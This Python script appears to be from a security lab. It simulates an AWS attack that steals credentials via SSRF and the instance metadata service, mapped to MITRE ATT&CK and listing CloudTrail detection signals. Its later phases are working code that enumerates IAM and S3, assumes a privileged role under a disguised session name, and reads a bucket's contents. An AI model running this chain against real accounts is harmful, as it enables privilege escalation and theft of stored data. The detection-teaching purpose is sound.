# credential_theft.py
# MITRE ATT&CK: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
#               T1078.004 - Valid Accounts: Cloud Accounts (role chaining)
#               T1530     - Data from Cloud Storage
#
# Purpose: Simulate a complete credential theft attack chain
#
# Scenario:
#   1. Attacker exploits SSRF vulnerability in web application
#   2. SSRF reaches EC2 Instance Metadata Service (IMDS)
#   3. IMDS returns IAM role credentials (no auth required - IMDSv1)
#   4. Attacker uses stolen credentials from external location
#   5. Enumerates environment to find escalation path
#   6. Assumes privileged role via misconfigured trust policy
#   7. Uses escalated credentials to read sensitive S3 data
#
# Real world reference:
#   Capital One breach (2019) - SSRF -> IMDS -> S3 exfiltration
#   https://attack.mitre.org/techniques/T1552/005/
#
# Usage:
#   export AWS_ACCOUNT_ID="your-account-id"
#   export TARGET_BUCKET="cloud-attack-lab-target-data-your-account-id"
#   AWS_PROFILE=lab-attacker python attack-simulation/credential_theft.py

import boto3
import json
import os
from botocore.exceptions import ClientError
from datetime import datetime, timezone

# -------------------------------------------------------
# CONFIGURATION
# -------------------------------------------------------

AWS_ACCOUNT_ID = os.environ.get('AWS_ACCOUNT_ID')
TARGET_BUCKET  = os.environ.get('TARGET_BUCKET')

if not AWS_ACCOUNT_ID:
    print("[-] AWS_ACCOUNT_ID environment variable not set")
    print("    Run: export AWS_ACCOUNT_ID=your-account-id")
    exit(1)

if not TARGET_BUCKET:
    print("[-] TARGET_BUCKET environment variable not set")
    print("    Run: export TARGET_BUCKET=cloud-attack-lab-target-data-your-account-id")
    exit(1)

ROLE_ARN = f"arn:aws:iam::{AWS_ACCOUNT_ID}:role/cloud-attack-lab-privileged-role"

# -------------------------------------------------------
# PHASE 1 — Simulate IMDS credential retrieval
# In a real attack this would be an HTTP GET to:
# http://169.254.169.254/latest/meta-data/iam/security-credentials/
#
# The attacker uses an SSRF vulnerability to make the server
# send that request and return the credentials to them
# No authentication required on IMDSv1 endpoints
# -------------------------------------------------------

def simulate_imds_retrieval():
    print("\n[*] Phase 1 — IMDS Credential Retrieval (Simulated)")
    print("    Attack vector: SSRF vulnerability in web application")
    print("    Target: http://169.254.169.254/latest/meta-data/")
    print("            iam/security-credentials/<role-name>")
    print()

    # This structure mirrors a real IMDSv1 response exactly
    # In the lab we simulate this since we don't have a vulnerable app
    simulated_imds_response = {
        "Code": "Success",
        "Type": "AWS-HMAC",
        "AccessKeyId": "ASIA[REDACTED-IN-LAB]",
        "SecretAccessKey": "[REDACTED-IN-LAB]",
        "Token": "[SESSION-TOKEN-REDACTED-IN-LAB]",
        "Expiration": "2026-03-11T23:59:59Z",
        "LastUpdated": datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
    }

    print("[+] Simulated IMDS response received:")
    print(json.dumps(simulated_imds_response, indent=4))
    print()
    print("    IMDSv1 requires no authentication — any SSRF can retrieve this")
    print("    IMDSv2 requires a PUT request first to get a session token")
    print("    Detection: CloudTrail shows role credentials used from public IP")

# -------------------------------------------------------
# PHASE 2 — Use stolen credentials from external location
# Attacker now operates from their own machine using the stolen creds
# CloudTrail anomaly: role credentials appearing from a public IP
# instead of from within AWS infrastructure
# -------------------------------------------------------

def enumerate_with_stolen_creds(session):
    print("\n[*] Phase 2 — Enumeration with Stolen Credentials")
    print("    Simulating attacker operating from external/public IP")
    print("    CloudTrail anomaly: API calls from unexpected source IP")

    sts = session.client('sts')
    iam = session.client('iam')
    s3  = session.client('s3')

    # Confirm current identity
    try:
        identity = sts.get_caller_identity()
        print(f"\n[*] Current identity (stolen credentials):")
        print(f"    ARN:     {identity['Arn']}")
        print(f"    Account: {identity['Account']}")
    except ClientError as e:
        print(f"[-] Identity check failed: {e.response['Error']['Code']}")
        return False

    # Enumerate IAM users — mapping the environment
    print("\n[*] Enumerating IAM users (T1069.003)")
    try:
        users = iam.list_users()['Users']
        print(f"[+] Found {len(users)} IAM users:")
        for user in users:
            print(f"    {user['UserName']} — created {user['CreateDate'].strftime('%Y-%m-%d')}")
    except ClientError as e:
        print(f"[-] IAM enumeration failed: {e.response['Error']['Code']}")

    # Enumerate IAM roles — looking for escalation path
    print("\n[*] Enumerating IAM roles — searching for escalation path")
    try:
        roles = iam.list_roles()['Roles']
        print(f"[+] Found {len(roles)} IAM roles:")
        for role in roles:
            print(f"    {role['RoleName']}")
            # Flag roles that look like escalation targets
            if 'privileged' in role['RoleName'].lower():
                print(f"    ^^^ HIGH VALUE TARGET — checking trust policy")
    except ClientError as e:
        print(f"[-] Role enumeration failed: {e.response['Error']['Code']}")

    # Enumerate S3 buckets
    print("\n[*] Enumerating S3 buckets")
    try:
        buckets = s3.list_buckets()['Buckets']
        print(f"[+] Found {len(buckets)} S3 buckets:")
        for bucket in buckets:
            print(f"    {bucket['Name']}")
    except ClientError as e:
        print(f"[-] S3 enumeration failed: {e.response['Error']['Code']}")

    return True

# -------------------------------------------------------
# PHASE 3 — Escalate privileges via role assumption
# Attacker discovered privileged role during enumeration
# Misconfigured trust policy allows attacker to assume it
# -------------------------------------------------------

def escalate_privileges(session):
    print("\n[*] Phase 3 — Privilege Escalation (T1078.004)")
    print(f"    Target role: {ROLE_ARN}")
    print("    Exploiting misconfigured trust policy")

    sts = session.client('sts')

    try:
        response = sts.assume_role(
            RoleArn=ROLE_ARN,
            RoleSessionName="maintenance-automation",  # benign session name
            DurationSeconds=900
        )

        creds = response['Credentials']
        print(f"[+] Role assumption SUCCESSFUL")
        print(f"    New Access Key: {creds['AccessKeyId']}")
        print(f"    Expiration:     {creds['Expiration']}")
        print(f"    Credential type: Temporary (STS)")

        # Build new session with escalated credentials
        escalated_session = boto3.Session(
            aws_access_key_id=creds['AccessKeyId'],
            aws_secret_access_key=creds['SecretAccessKey'],
            aws_session_token=creds['SessionToken'],
            region_name='us-east-1'
        )

        # Confirm new identity
        new_identity = escalated_session.client('sts').get_caller_identity()
        print(f"\n[*] Escalated identity:")
        print(f"    ARN: {new_identity['Arn']}")
        print(f"    Type: AssumedRole (was IAMUser)")

        return escalated_session

    except ClientError as e:
        print(f"[-] Escalation failed: {e.response['Error']['Code']}")
        return None

# -------------------------------------------------------
# PHASE 4 — Exfiltrate sensitive data using escalated credentials
# Attacker now has s3:GetObject via the privileged role
# Reads all sensitive files from the target bucket
# -------------------------------------------------------

def exfiltrate_data(escalated_session):
    print("\n[*] Phase 4 — Data Exfiltration (T1530)")
    print(f"    Target bucket: {TARGET_BUCKET}")
    print("    Using escalated role credentials")

    s3 = escalated_session.client('s3')

    # List all objects in target bucket
    try:
        objects = s3.list_objects_v2(Bucket=TARGET_BUCKET).get('Contents', [])
        print(f"\n[+] Found {len(objects)} objects to exfiltrate:")

        for obj in objects:
            key = obj['Key']
            size = obj['Size']
            print(f"\n    [{key}] ({size} bytes)")

            # Read each file — simulates actual exfiltration
            try:
                response = s3.get_object(Bucket=TARGET_BUCKET, Key=key)
                content = response['Body'].read().decode('utf-8')
                # Show first line only — enough to prove access
                first_line = content.split('\n')[0]
                print(f"    Preview: {first_line}")
                print(f"    [+] GetObject SUCCESSFUL — data exfiltrated")
            except ClientError as e:
                print(f"    [-] GetObject failed: {e.response['Error']['Code']}")

    except ClientError as e:
        print(f"[-] ListObjectsV2 failed: {e.response['Error']['Code']}")

# -------------------------------------------------------
# MAIN — orchestrates the full attack chain
# -------------------------------------------------------

def main():
    print("=" * 60)
    print("  Credential Theft Attack Chain Simulation")
    print("  MITRE ATT&CK: T1552.005 -> T1078.004 -> T1530")
    print(f"  Time: {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}")
    print("=" * 60)

    # Phase 1 — simulate IMDS credential retrieval
    simulate_imds_retrieval()

    # Phase 2 — enumerate using stolen credentials
    attacker_session = boto3.Session(
        profile_name='lab-attacker',
        region_name='us-east-1'
    )

    success = enumerate_with_stolen_creds(attacker_session)
    if not success:
        print("[-] Enumeration failed — check attacker profile configuration")
        exit(1)

    # Phase 3 — escalate privileges
    escalated_session = escalate_privileges(attacker_session)
    if not escalated_session:
        print("[-] Escalation failed — check role trust policy")
        exit(1)

    # Phase 4 — exfiltrate data
    exfiltrate_data(escalated_session)

    print("\n" + "=" * 60)
    print("[+] Full attack chain complete")
    print()
    print("    CloudTrail events generated:")
    print("    - GetCallerIdentity      (T1033)")
    print("    - ListUsers              (T1069.003)")
    print("    - ListRoles              (T1069.003)")
    print("    - ListBuckets            (T1530)")
    print("    - AssumeRole             (T1078.004)")
    print("    - ListObjectsV2          (T1530)")
    print("    - GetObject x4           (T1530) <- actual exfiltration")
    print()
    print("    Detection signals:")
    print("    - Enumeration chain from single identity")
    print("    - AssumeRole from external IP")
    print("    - GetObject on sensitive files via AssumedRole")
    print("    - All activity from public IP not internal AWS")
    print("=" * 60)

if __name__ == "__main__":
    main()